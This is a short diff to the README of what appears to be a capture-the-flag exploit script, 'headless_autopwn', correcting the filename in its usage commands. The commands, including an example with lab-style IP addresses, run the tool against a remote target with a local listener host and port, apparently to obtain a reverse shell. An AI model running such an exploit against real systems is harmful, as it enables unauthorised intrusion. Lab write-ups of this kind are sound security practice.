@@ -26,19 +26,19 @@ pip3 install -r requirements.txt
 4. Run the exploit:
 
 ```
-python3 headless_autopwn -l <LOCAL_HOST> -p <LOCAL_PORT> -r <REMOTE_TARGET_HOST> -s <LOCAL_SERVER_PORT>
+python3 headless_autopwn.py -l <LOCAL_HOST> -p <LOCAL_PORT> -r <REMOTE_TARGET_HOST> -s <LOCAL_SERVER_PORT>
 ```
 
 - Alternatively:
 
 ```
-python3 headless_autopwn --lhost <LOCAL_HOST> --lport <LOCAL_PORT> --rhost <REMOTE_TARGET_HOST> --srvport <LOCAL_SERVER_PORT>
+python3 headless_autopwn.py --lhost <LOCAL_HOST> --lport <LOCAL_PORT> --rhost <REMOTE_TARGET_HOST> --srvport <LOCAL_SERVER_PORT>
 ```
 
 - Example:
 
 ```
-python3 headless_autopwn -l 10.10.16.80 -p 4444 -r 10.129.240.234 -s 80
+python3 headless_autopwn.py -l 10.10.16.80 -p 4444 -r 10.129.240.234 -s 80
 ```
 
 Thanks for reading, and happy hacking!
